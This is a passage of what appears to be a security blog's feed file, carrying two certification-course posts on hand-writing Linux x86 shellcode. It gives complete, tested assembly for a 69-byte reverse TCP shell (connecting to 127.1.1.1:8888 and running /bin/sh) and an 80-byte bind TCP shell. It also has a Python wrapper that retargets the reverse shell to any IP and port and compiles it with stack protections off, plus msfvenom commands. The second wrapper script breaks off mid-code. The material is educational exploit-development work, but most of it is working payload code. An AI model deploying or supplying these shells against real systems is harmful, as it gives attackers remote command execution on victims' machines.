+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span><br />
+<span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding:  Tale of the Smallest Reverse TCP Shellcode</title>
+            <link>/posts/2018/01/art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode/</link>
+            <pubDate>Fri, 05 Jan 2018 20:25:00 +0530</pubDate>
+            
+            <guid>/posts/2018/01/art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode/</guid>
+            <description>Modern Ninja :)    Hey Folks, Hope you guys are doing great. In the previous article, we saw how we can create a bind TCP shellcode, reduce its enormous length from 108 bytes to merely 80 bytes by making use of strategically placed instructions, register re-use, single byte instructions and much more. We also saw how we can create a wrapper in python which will help us modify the shellcode and make it usable for any port of choice.</description>
+            <content type="html"><![CDATA[<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-eyechangedlogogreen.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-eyechangedlogogreen.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Modern Ninja :)</td>
+</tr>
+</tbody>
+</table>
+
+<p>Hey Folks, Hope you guys are doing great. In the previous article, we
+saw how we can create a bind TCP shellcode, reduce its enormous length
+from <strong>108</strong> bytes to merely <strong>80</strong> bytes by making use of strategically
+placed instructions, register re-use, single byte instructions and much
+more. We also saw how we can create a wrapper in python which will help
+us modify the shellcode and make it usable for any port of choice.
+In this article, we will discuss how we can create a reverse TCP
+shellcode. In case you missed my previous post, <a href="http://www.nipunjaswal.com/2018/01/the-saga-of-bind-tcp.html" target="_blank">click
+here</a> to
+read it first since this post builds heavily on the mechanisms discussed
+in the last post.</p>
+
+<p>Our Agenda for this exercise is to:</p>
+
+<ul>
+<li>Build a Null Free TCP reverse shellcode</li>
+<li>Write a wrapper that can update IP address and port in the shellcode</li>
+<li>Write an efficient and small shellcode</li>
+</ul>
+
+<p><span style="font-family: inherit;"><span
+style="font-size: x-small;"><span style="color: orange;"><strong>Note: On this
+day (Friday, Jan 5, 2018, 1:28 AM IST) The shellcode we created in this
+post is the smallest Null -Free and Register Pollution Free /bin/sh
+shellcode (checked on exploit-db.com), Not counting ( Register Pollution
+based Shellcodes, Netcat Reverse Shells)</strong></span></span></span>
+<span style="font-family: inherit;"><span
+style="font-size: x-small;"><span style="color: orange;"><strong>Update: The
+Shellcode has been accepted by Exploit-DB and can be found
+at </strong></span></span></span><span
+style="color: red; font-size: x-small;"><strong><a href="https://www.exploit-db.com/exploits/43433/" target="_blank">https://www.exploit-db.com/exploits/43433/</a></strong></span></p>
+
+<blockquote>
+<p>[shellcode] Linux/x86 - Reverse TCP Shell (127.1.1.1:8888/TCP)
+Shellcode (69 bytes) <a href="https://t.co/a8OWh1glPG" target="_blank">https://t.co/a8OWh1glPG</a></p>
+
+<p>— Exploit Database (@ExploitDB) <a href="https://twitter.com/ExploitDB/status/949231418843971585?ref_src=twsrc%5Etfw" target="_blank">January 5,
+2018</a></p>
+</blockquote>
+
+<p>So, let&rsquo;s quickly generate a linux/x86/shell_reverse_tcp using
+msfvenom and feed it to libemu as shown on the following screen:</p>
+
+<table>
+<colgroup>
+<col style="width: 50%" />
+<col style="width: 50%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-02%2B16.00.25.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-02%2B16.00.25.png" /></a></td>
+<td></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Libemu Analysis of the Reverse Shell TCP</td>
+<td><br />
+</td>
+</tr>
+</tbody>
+</table>
+
+<p>We can see that we have primarily four system calls that will come handy
+for creating shellcode for reverse TCP which are: <strong>socket, dup2,
+connect</strong> and <strong>execve</strong>. The main change in this shellcode is that
+instead of having system calls like <strong>bind, accept and listen</strong>, we have
+connect system call only. This makes our work reasonably comfortable as
+the only change required is to place the connect system call instead of
+all the three discussed above. So let&rsquo;s get started. However, we will
+try to write a much more efficient and space friendly code this time.
+The first call is SYS_SOCKET, let&rsquo;s set it up as shown on the following
+screen:</p>
+
+<blockquote>
+<p>xor ebx,ebx ; Clearing out EBX
+push ebx     ; Pushing 0 onto the stack i.e. Value of EBX &mdash;&gt;
+IP_PROTO
+inc ebx        ; Increment EBX to 1  &mdash;&gt; SYS_SOCKET
+push ebx     ; Push 1 onto the stack &mdash;&gt; SOCK_STREAM
+push 0x2     ; Push 2 onto the stack &mdash;&gt; AF_INET (domain:
+Internet)
+mov ecx, esp ; Move the pointer to ECX, which will point to {2,1,0}
+push 0x66   ; SOCKETCALL
+pop eax       ;  SOCKETCALL &ndash;&gt; EAX
+int 0x80      ; Interrupt ( EAX=&gt; 0x66 EBX=0x1 ECX =&gt; {2,1,0}</p>
+</blockquote>
+
+<p>Similar to the bind shell, we setup SYS_SOCKET as shown above. We can
+see we have DUP2 as the next system call which is being called thrice.
+Hence, let&rsquo;s set it up as follow:</p>
+
+<blockquote>
+<p>xchg ebx,eax ; The resultant sockfd value from the previous call is
+moved to EBX
+pop ecx       ; Top of the stack contains 2 pushed in the previous
+call, we load it to ECX
+loop:           ; Loop Begins
+    mov al,0x3f ; Moving DUP2 call to EAX
+    int 0x80  ; Interrupt
+    dec ecx   ; Decreasing ECX
+    jns loop  ; Loop until SF Not Set</p>
+</blockquote>
+
+<p>The above set of instructions will loop until the value of ECX becomes
+zero and SF Flag is set.  Next, We have the core system call of this
+shellcode which will connect to the listeners IP address on the
+specified port. Let&rsquo;s set up the connect system call as follows:</p>
+
+<blockquote>
+<p> 
+push 0x101017f      ; IP Address 127.1.1.1
+push word 0xb822  ; Port 8888  (DWORD would have caused a NULL Byte)
+push word 2            ; AF_INET  (Null Byte in AF_INET: 0002)
+mov ecx,esp            ; Pointer 1 to {b8220002,0101017f)        
+mov al,0x66            ; SOCKETCALL
+push eax                  ; We push 66 as length (Clearing EAX not
+required)
+push ecx                  ; Pointer 1 Pushed onto the stack
+push ebx                  ; Sockfd pushed onto the stack
+mov bl,0x3              ; EBX now contains SYS_CONNECT
+mov ecx,esp            ; Pointer 2 &ndash;&gt; {sockfd, Pointer 1, 66}
+int 0x80                  ; Interrupt Generated</p>
+</blockquote>
+
+<p>There are two main highlights here; We did not move 0xb8220002 as a
+DWORD this may have decreased the length of the shellcode, but it would
+have introduced a Null byte as well(<strong>00</strong>02). Hence, we pushed port in
+two halves. Additionally, we did not use IP as 127.0.0.1 because it
+would have contained nulls as well. Interestingly, we did not load 16 as
+the length this time and pushed the value of the call itself as length.
+This also means that it has a negligible effect on the system call.
+Hence, we saved bytes required to clear it out and loading the value 16
+in there as we did in the previous post. Finally, we have the last
+segment of code as follows:</p>
+
+<blockquote>
+<p> 
+push edx ; Pushing 0 Value to the stack
+push 0x68732f2f ; /bin
+push 0x6e69622f; //sh
+mov ebx,esp ; pointer 1 {/bin//sh}
+push edx ; Pushing 0 Value to the stack
+push ebx ; Pointer 1 to the stack
+mov ecx,esp ; pointer 2 {Pointer 1, 0}
+mov al,0xb ; EXECVE System Call
+int 0x80 ; Interrupt</p>
+</blockquote>
+
+<p>The code above is nothing but setting up EXECVE like we did in the last
+post. Compiling the code we have:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.17.34.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.17.34.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Generating Shellcode</td>
+</tr>
+</tbody>
+</table>
+
+<p> Compiling the shellcode in a C program and testing it, we can see that
+our shellcode works correctly as shown below:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.20.20.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.20.20.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Compiling and running shellcode.c program with our shellcode</td>
+</tr>
+</tbody>
+</table>
+
+<p>Let&rsquo;s write a python wrapper for the shellcode so that changing IP
+address and PORT on the fly won&rsquo;t be a hassle for us:</p>
+
+<blockquote>
+<p> </p>
+
+<pre><code>#!/usr/bin/python
+import sys
+import socket
+print &quot;Stub File:&quot;+sys.argv[1]
+print &quot;IP Addr:&quot;+sys.argv[2]
+print &quot;Port Used:&quot;+ sys.argv[3]
+ip_addr= sys.argv[2].split(&quot;.&quot;)
+ip_addr_bytes = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip_addr))
+
+with open(sys.argv[1]+&quot;.c&quot;, &quot;rb&quot;) as f:
+    contents = f.readlines()
+
+def H( hexStr ):
+    bytes = []
+    hexStr = ''.join( hexStr.split(&quot; &quot;) )
+    for i in range(0, len(hexStr), 2):
+        bytes.append( chr( int (hexStr[i:i+2], 16 ) ) )
+    return ''.join( bytes )
+
+ip_addr_final= repr(H(ip_addr_bytes)).replace(&quot;'&quot;,&quot;&quot;)
+
+port = hex(int(sys.argv[3])).split('x')[1]
+fh, sh = port[:2],port[2:]
+if len(fh) == 1: fh = &quot;0&quot; + fh
+if len(sh) == 1: sh = &quot;0&quot; + sh
+_p = &quot;\\x{0}\\x{1}&quot;.format(fh,sh)
+for j,i in enumerate(contents):
+    if &quot;\\x22\\xb8&quot; in i:
+        print &quot;Line Number :&quot; + str(j)
+ contents[j] = '&quot;' + _p +'&quot;'
+    elif &quot;\\x7f\\x01\\x01\\x01&quot; in i:
+ print &quot;Line Number :&quot; + str(j)
+ contents[j] = '&quot;' +ip_addr_final + '&quot;'
+nf = sys.argv[1]+&quot;_new.c&quot;
+with open(nf, &quot;wb&quot;) as f:
+    f.writelines(contents)
+import os
+os.system(&quot;gcc {0} -o {1} -fno-stack-protector -z execstack&quot;.format(nf,sys.argv[1]))
+os.system(&quot;rm {0}&quot;.format(nf))
+</code></pre>
+
+<p> </p>
+</blockquote>
+
+<p>Running the python code, we can see that we can now change IP and port
+parameters on the fly:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.46.49.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.46.49.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Wrapper &amp; Execution</td>
+</tr>
+</tbody>
+</table>
+
+<p>We have completed all the required tasks. We now have one of the
+smallest reverse TCP shellcode with an on the fly IP and Port changing
+wrapper.</p>
+
+<p>Files for this tutorial can be found at:
+<a href="https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-2" target="_blank">https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-2</a></p>
+
+<p><span style="color: red;">This blog post has been created for completing
+the requirements of the SecurityTube Linux Assembly Expert
+certification:</span>
+<span style="color: red;"> </span><span
+style="color: red;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span style="color: red;"> </span><span style="color: red;">Student-ID:
+SLAE-1080</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding: The Saga of Bind TCP Shell</title>
+            <link>/posts/2018/01/art-of-shellcoding-the-saga-of-bind-tcp-shell/</link>
+            <pubDate>Tue, 02 Jan 2018 14:24:00 +0530</pubDate>
+            
+            <guid>/posts/2018/01/art-of-shellcoding-the-saga-of-bind-tcp-shell/</guid>
+            <description>Dear Readers, we all in the infosec community use bind TCP shell almost on a daily basis. I too have seen many people copying shellcodes blindly from the internet and just pasting them into the exploits without knowing what those shellcodes might be carrying.
+
+Today, we will uncover the working of bind TCP shell and based on the analysis, we will try to develop one ourselves. If you are not familiar with the assembly, Enroll yourself into SLAE course from SecurityTube, its one of the best classes available out there and i am able to write this post based on the advanced knowledge i gained from the course itself.</description>
+            <content type="html"><![CDATA[<p>Dear Readers, we all in the infosec community use bind TCP shell almost
+on a daily basis. I too have seen many people copying shellcodes blindly
+from the internet and just pasting them into the exploits without
+knowing what those shellcodes might be carrying.</p>
+
+<p><a href="../images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-shell.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-shell.png" alt="" /></a></p>
+
+<p>Today, we will uncover
+the working of bind TCP shell and based on the analysis, we will try to
+develop one ourselves. If you are not familiar with the assembly, Enroll
+yourself into SLAE course from
+<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">SecurityTube</a>,
+its one of the best classes available out there and i am able to write
+this post based on the advanced knowledge i gained from the course
+itself. Anyways, The agenda of this exercise is to:</p>
+
+<ul>
+<li>Analyze the Bind Shell generated from Metasploit</li>
+<li>Create your own shellcode based on the analysis</li>
+<li>Remove any Null bytes (Bad Characters)</li>
+<li>Generate a space friendly shellcode (minimalistic)</li>
+<li>Write a wrapper to dynamically change the bind port</li>
+</ul>
+
+<p>So let&rsquo;s get started, we will use <strong>libemu</strong> to analyze the
+<strong>bind_shell_tcp</strong> shellcode for x86 Linux. The analytics for this
+shellcode can be drawn through the following command:</p>
+
+<pre><code>msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4444 -f raw | sctest -vvv -Ss 10000
+</code></pre>
+
+<p>Creating a graphical representation of the shellcode using libemu, we
+have the following flow diagram of the bind_shell_tcp payload as shown
+in the next screen:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-linux-shell-bind-tcp-x86.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-linux-shell-bind-tcp-x86.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Analysis of the BIND TCP Shellcode generated using msfvenom</td>
+</tr>
+</tbody>
+</table>
+
+<p>We can see that we have a pretty straightforward workflow which displays
+all the important system calls used by the bind_shell_tcp shellcode.
+However, let us try tracing all the system calls, parameters involved,
+etc. using <strong>strace</strong> as shown on the following screen:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-calls.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-calls.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Strace Analysis on the shellcode</td>
+</tr>
+</tbody>
+</table>
+
+<p>We can clearly see the order and parameters passed to the system calls.
+Let&rsquo;s use this information as a base for our shellcode and jump directly
+into building a shellcode from the very scratch:</p>
+
+<pre><code> xor ebx,ebx     ; Clearing EBX Register
+ xor eax,eax     ; Clearing EAX Register
+ mov al,102      ; Moving SocketCall to EAX(Sys Call Number= 102)
+ inc bl          ; (Saving 1 Byte) Moving 1 to EBX with a Byte Less,
+ otherwise w$
+ push esi        ; Pushing 0 onto the stack(0: IPPROTO_IP)
+ push byte 1     ; Pushing 1 onto the stack(1: SOCK_STREAM)
+ push byte 2     ; Pushing 2 onto the stack(2: AF_INET)
+ mov ecx,esp     ; Load pointer to the stack structure to ECX
+ int 0x80        ; Calling Interrupt
+</code></pre>
+
+<p>What did we do? Initially, we cleared both <code>EAX</code> and <code>EBX</code> registers and moved the socketcall identifier (<code>102 | 0x66</code>) to <code>EAX</code>(AL),  We could have
+moved 1 to <code>BL</code>. Instead, we used <code>INC</code>(Increment) instruction which makes
+the value inside <code>BL</code> as 1. We pushed <code>0</code>  to the stack which is the value
+for <code>IPPROTO_IP</code>. Similarly, we pushed <code>1</code> and <code>2</code> onto the stack which is
+nothing but <code>SOCK_STREAM</code> and <code>PF_INET</code>. This makes stack contain {2,1,0}.
+  We have already set <code>EAX</code> and <code>EBX</code>, we need to set <code>ECX</code> to the stack. Hence,
+we move <code>ESP</code> to <code>ECX</code>. Next, we simply call the Interrupt. Looking at the
+socketcall:</p>
+
+<pre><code> int socketcall(int call, unsigned long **args);
+</code></pre>
+
+<ul>
+<li>The <strong>socketcall</strong> identifier is 102 &mdash;&gt; EAX</li>
+<li><strong>int call</strong> identifier is 1 &mdash;-&gt; 1: SYS_SOCKET &mdash;&gt; EBX</li>
+<li><strong>unsigned long *</strong><em>args</em> &mdash;-&gt;{2,1,0} &mdash;&gt; Address &mdash;&gt;
+ECX</li>
+</ul>
+
+<p>Setting up the <code>SYS_SOCKET</code>, next task is to setup bind system call,
+let&rsquo;s get started:</p>
+
+<pre><code> xchg edi,eax         ; Saving the Result After Syscall from EAX to EDI
+ push esi             ; Zero Pushed onto the Stack
+ push word 0xb822     ; Port 8888 Pushed onto the Stack
+ push word 2          ; 2 Pushed onto the Stack
+ mov ebx,esp          ; Top of the stack stored to EBX-&gt;{0xb8220002,0}
+ push byte 16         ; 16 Pushed onto the Stack
+ push ebx             ; Pointer --&gt; {Port,0}
+ push edi             ; EDI Points to Result from SocketCALL
+ xor ebx,ebx          ; Clearing EBX
+ mul ebx              ; Clearing EAX
+ mov al,102           ; SOCKETCALL Identifier
+ mov bl,2             ; int call is bind here; 2
+ mov ecx,esp          ; Address of the top of the stack to ECX
+ int 0x80             ; Interrupt
+
+</code></pre>
+
+<p> </p>
+
+<pre><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+</code></pre>
+
+<p>We store the result from the previous call to EDI from EAX which is
+nothing but the value to be placed in <strong>sockfd</strong>. We push 0 onto the
+stack with <code>PUSH ESI</code> and then <code>PUSH 0xb8220002</code> onto the stack. We did this
+in two steps using push word instruction because pushing it in one go
+would have resulted in a NULL byte generated by leading two zeros of the
+<code>0002</code>. So, now our stack becomes {b8220002, 00000000}. We store the
+address of current <code>ESP</code> to <code>EBX</code>. Next, we push <code>16</code> which is <strong>socklen_t</strong>,
+we push EBX as <strong>sockaddr</strong>, and we push <strong>sockfd</strong> stored in <code>EDI</code>.</p>
+
+<p>We now have the complete structure of arguments present on the stack,
+and since everything is placed correctly on the stack, we can clear the
+<code>EBX</code> and <code>EAX</code> registers. Let&rsquo;s issue another <code>SOCKETCALL</code> with call type as
+<code>SYS_BIND</code> denoted by 2 as the identifier. So, we move <code>102</code> to <code>EAX</code>, <code>2</code> to
+<code>EBX</code> and Top of the stack which contains our parameter structure to <code>ECX</code>
+and issues the interrupt. The Next call is to <code>listen</code>. Let &rsquo;s see what
+parameters are required for this call to work:</p>
+
+<pre><code>int listen(int sockfd, int backlog);
+</code></pre>
+
+<pre><code> push esi               ; Backlog Value 0
+ push edi               ; Pushing Sockfd onto the stack
+ xor ebx,ebx            ; Clearing EBX
+ mul ebx                ; Clearing EAX
+ mov al,102             ; SOCKETCALL
+ mov bl,4               ; Listen call
+ mov ecx,esp            ; Pointing pushed values to ECX
+ int 0x80               ; Interrupt
+</code></pre>
+
+<p>We know we have our sockfd in the <code>EDI</code> let&rsquo;s push it to the stack after
+pushing 0 for the backlog by issuing <code>PUSH ESI</code>. Next, we just clear off
+<code>EAX</code> and <code>EBX</code> registers and build registers to issue another <code>SOCKETCALL</code>.
+But this time, we move 4 to EBX which denotes SYS_Listen call, we move
+the top of the stack to ECX and simply issue the interrupt. Next, we
+move to the accept call as follows:</p>
+
+<pre><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+</code></pre>
+
+<p>We will similarly setup this system call like the way we did for the
+earlier ones:</p>
+
+<pre><code> xor ebx,ebx    ; Clearing EBX
+ mul ebx          ; Clearing EAX
+ push esi          ; 0
+ push esi          ; 0
+ push edi          ; Sockfd
+ mov al,102     ; Socketcall
+ mov bl,5         ; accept
+ mov ecx,esp   ; moving pointer to {sockfd,0,0} to ECX
+ int 0x80          ; Generating interrupt
+</code></pre>
+
+<p>Pretty straightforward! We are putting the value 0 for <code>sockadd*</code> and
+<code>socklen_t</code> while having the sockfd pushed through EDI. We just set up
+this call using 5(accept) in EBX. The final segment of the code contains
+two crucial system calls which are dup2 and execve. Let&rsquo;s see the code
+fragment:</p>
+
+<blockquote>
+<p><span class="pl-k">xchg</span><span class="pl-en"> </span><span
+class="pl-v">ebx</span><span class="pl-s1">,</span><span
+class="pl-v">eax</span><span class="pl-c"> ; </span></p>
+</blockquote>
+
+<p><span class="pl-k">xor</span><span class="pl-en"> </span><span
+class="pl-v">ecx</span><span class="pl-s1">,</span><span
+class="pl-v">ecx</span><span class="pl-c"> ; Clearing ECX</span></p>
+
+<p><span class="pl-k">mov</span><span class="pl-en"> </span><span
+class="pl-v">cl</span><span class="pl-s1">,</span><span
+class="pl-c1">2</span><span class="pl-c"> ; Moving 2 to ECX</span></p>
+
+<p><span class="pl-k">loop</span><span class="pl-en">: </span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">al</span><span
+class="pl-s1">,</span><span class="pl-c1">63</span><span class="pl-c"> ;
+Calling DUP2</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">int</span><span
+class="pl-en"> </span><span class="pl-c1">0x80</span><span class="pl-c">
+; Calling Interrupt</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">dec</span><span
+class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-c"> ;
+Dec ECX</span></p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td><span class="pl-en"> jns </span><span class="pl-k">loop</span><span class="pl-c"> ; Jump to loop till SF not set </span></td>
+</tr>
+<tr class="even">
+<td></td>
+</tr>
+</tbody>
+</table>
+
+<p><span class="pl-en">done:</span></p>
+
+<p><span class="pl-c"> ;EXECVE</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">xor</span><span
+class="pl-en"> </span><span class="pl-v">eax</span><span
+class="pl-s1">,</span><span class="pl-v">eax</span><span class="pl-en">
+</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">push</span><span
+class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-c"> ;
+0</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">push</span><span
+class="pl-en"> </span><span class="pl-c1">0x68732f2f</span><span
+class="pl-c"> ; //sh</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">push</span><span
+class="pl-en"> </span><span class="pl-c1">0x6e69622f</span><span
+class="pl-c"> ; /bin</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">ebx</span><span
+class="pl-s1">,</span><span class="pl-v">esp</span><span class="pl-c"> ;
+Pointer to Structures in Stack(Top)</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">ecx</span><span
+class="pl-s1">,</span><span class="pl-v">eax</span><span class="pl-c"> ;
+0 to ECX</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">edx</span><span
+class="pl-s1">,</span><span class="pl-v">eax</span><span class="pl-c"> ;
+0 to EDX</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">mov</span><span
+class="pl-en"> </span><span class="pl-v">al</span><span
+class="pl-s1">,</span><span class="pl-c1">11</span><span class="pl-c"> ;
+EXECVE CALL</span></p>
+
+<p><span class="pl-en"> </span><span class="pl-k">int</span><span
+class="pl-en"> </span><span class="pl-c1">0x80</span><span class="pl-c">
+; Interrupt</span></p>
+
+<p>We simply exchange the result to EBX from EAX which held the result from
+the last system call. Next, we cleared ECX and moved value 2 into it. We
+did this because of  3 distinct values of descriptors for which we will
+call dup2. Next, we issue dup2 call denoted by 63 in a loop till ECX
+becomes 0 and Finally, we push null terminated /bin//sh and point it to
+EBX:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B15.57.48.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B15.57.48.png" alt="" /></a></p>
+
+<p>Next, we clear out ECX and EDX using 0 from EAX. We move call number
+11(EXECVE) to EAX and issue the interrupt. Let&rsquo;s extract the shellcode
+from the program as follows:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.05.03.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.05.03.png" alt="" /></a></p>
+
+<p>Compiling the C program and running the shellcode, we can see that it
+works flawlessly:</p>
+
+<p><a href="./images/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.17.24.png"><img src="./images/thumbnails/2018-01-02-art-of-shellcoding-the-saga-of-bind-tcp-shell-Screenshot%2B2017-12-30%2B16.17.24.png" alt="" /></a></p>
+
+<p>Everything works flawlessly here. <span
+style="background-color: yellow;"><strong>The final version of the code can be
+obtained at: </strong></span>
+<a href="https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-1" target="_blank">https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-1</a></p>
+
+<p>We have a NULL free shellcode. However, the length of the shellcode is
+something which bothers me. A valid shellcode should be as small as
+possible, and 108 bytes just doesn&rsquo;t seem to fit in that definition. I
+have tweaked the code to make it smaller <span style="color: red;"><strong>(80
+Bytes)</strong></span> using the following set of techniques:</p>
+
+<ul>
+<li>Register Re-Use</li>
+<li>Making use of PUSH - POP Instructions</li>
+<li>Using Single Byte Instructions</li>
+<li>XCGG Instructions and many more</li>
+</ul>
+
+<p>The final minimalistic shellcode is as follows:</p>
+
+<blockquote>
+<pre><code> 
+
+global _start
+
+section .text
+
+_start:
+
+; SYS_SOCKET
+push 0x66
+pop eax
+cdq
+push ebx
+inc ebx
+push ebx
+push 0x2
+mov ecx,esp
+int 0x80
+
+; SYS_BIND
+pop ebx
+pop esi
+push edx
+push word 0xb822
+push edx
+push byte 0x02
+push 0x10
+push ecx
+push eax
+mov ecx,esp
+mov al,0x66
+int 0x80
+
+; SYS_LISTEN
+pop edx
+pop eax
+xor eax,eax
+push eax
+push edx
+cdq
+mov bl,0x4
+mov al,0x66
+int 0x80
+
+; SYS_ACCEPT
+inc ebx
+mov al,0x66
+int 0x80
+
+; DUP2
+xchg eax, ebx
+pop ecx
+loop:
+ mov al,63
+ int 0x80
+ dec ecx
+ jns loop
+done:
+ push eax
+ push 0x68732f2f
+ push 0x6e69622f
+ mov ebx,esp
+ push eax
+ mov ecx,esp
+ mov al,0xb ; EXECVE CALL
+ int 0x80
+</code></pre>
+</blockquote>
+
+<p> Additionally, since we know that the port 8888 is denoted in the
+shellcode using <strong>&ldquo;\x22\xb8&rdquo;</strong> bytes, we can simply build a generator
+script in python which will replace these bytes with the bytes of some
+other port and make the shellcode to change the port on the fly:</p>
+
+<blockquote>
+<p><span class="pl-c"><span class="pl-c">#</span>!/usr/bin/python</span></p>
+</blockquote>
+
+<p><span class="pl-k">import</span> sys</p>
+
+<p><span class="pl-c1">print</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>Stub File:<span
+class="pl-pds">&ldquo;</span></span><span class="pl-k">+</span>sys.argv[<span
+class="pl-c1">1</span>]</p>
+
+<p><span class="pl-c1">print</span> <span class="pl-s"><span
+class="pl-pds">&ldquo;</span>Port Used:<span
+class="pl-pds">&ldquo;</span></span><span class="pl-k">+</span>sys.argv[<span
+class="pl-c1">2</span>]</p>
+
+<p><span class="pl-k">with</span> <span
+class="pl-c1">open</span>(sys.argv[<span class="pl-c1">1</span>]<span
+class="pl-k">+</span><span class="pl-s"><span
+class="pl-pds">&ldquo;</span>.c<span class="pl-pds">&ldquo;</span></span>, <span
+class="pl-s"><span class="pl-pds">&ldquo;</span>rb<span
+class="pl-pds">&ldquo;</span></span>) <span class="pl-k">as</span> f:</p>
+
+<p>contents <span class="pl-k">=</span> f.readlines()</p>
+
+<p>port <span class="pl-k">=</span> <span class="pl-c1">hex</span>(<span
+class="pl-c1">int</span>(sys.argv[<span
+class="pl-c1">2</span>])).split(<span class="pl-s"><span
+class="pl-pds">&lsquo;</span>x<span class="pl-pds">&lsquo;</span></span>)[<span
